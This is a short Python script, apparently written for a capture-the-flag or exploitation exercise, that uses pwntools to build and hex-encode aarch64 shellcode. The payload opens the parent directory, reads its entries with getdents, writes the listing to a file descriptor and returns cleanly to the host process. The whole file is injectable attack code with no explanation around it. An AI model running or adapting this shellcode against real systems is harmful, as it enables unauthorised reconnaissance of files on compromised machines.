from pwn import *
import sys

context.arch = "aarch64"
context.bits = 64

shellcode = """
    mov x4, sp    /* store sp */
    sub sp, sp, #4096
"""

# nb = "\0"*0x1000
# shellcode += shellcraft.write("sp", nb, len(nb))               # send to stdout

shellcode += shellcraft.openat(0x63, '..', 0x4000)              # open dir
shellcode += shellcraft.mov("x12", "x0")                       # store fd from openat in x12
shellcode += shellcraft.syscall(0x3d, "x12", "sp", 0x1000)     # syscall: getdents(x12, sp, 0x1000)
shellcode += shellcraft.write(0x4, "sp", 0x1000)               # send to stdout
shellcode += shellcraft.close("x12")                           # close fd

shellcode += """
return:
    mov sp, x4    /* restore sp */
    movz  w0, #0  /* set w0 to 0, guess this is where ret fetches the code */
    ret           /* return */
"""

print(shellcode)
print(asm(shellcode).hex())
